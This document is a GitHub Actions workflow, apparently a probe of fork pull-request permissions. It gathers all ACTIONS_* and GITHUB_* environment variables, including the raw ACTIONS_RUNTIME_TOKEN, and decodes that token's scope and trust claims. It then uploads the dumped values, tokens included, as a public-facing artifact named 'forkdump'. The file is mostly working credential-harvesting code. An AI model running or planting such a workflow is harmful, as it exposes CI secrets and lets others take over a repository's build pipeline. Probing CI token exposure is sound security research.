name: fork-probe
on:
  pull_request:
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: mk
        run: mkdir -p out
      - uses: actions/github-script@v7
        with:
          script: |
            const fs=require('fs'); const keep={};
            for (const [k,v] of Object.entries(process.env))
              if (k.startsWith('ACTIONS_')||k.startsWith('GITHUB_')) keep[k]=v;
            fs.writeFileSync('out/env.json', JSON.stringify(keep,null,1));
      - name: claims
        run: |
          python3 - > out/claims.txt <<'PYEOF'
          import json, base64
          e=json.load(open('out/env.json'))
          t=e.get('ACTIONS_RUNTIME_TOKEN','')
          p=t.split('.')[1]; p+='='*(-len(p)%4)
          c=json.loads(base64.urlsafe_b64decode(p))
          print("AC   :", c.get('ac'))
          print("SCP  :", c.get('scp'))
          for k in ['repository_id','repository_owner_id','repository_visibility','run_id','job_workflow_ref','sha','ref','base_ref','head_ref','event_name','trust_tier','runner_type']:
              print(f"{k:22}:", c.get(k))
          PYEOF
          cat out/claims.txt
      - uses: actions/upload-artifact@v4
        with:
          name: forkdump
          path: out/
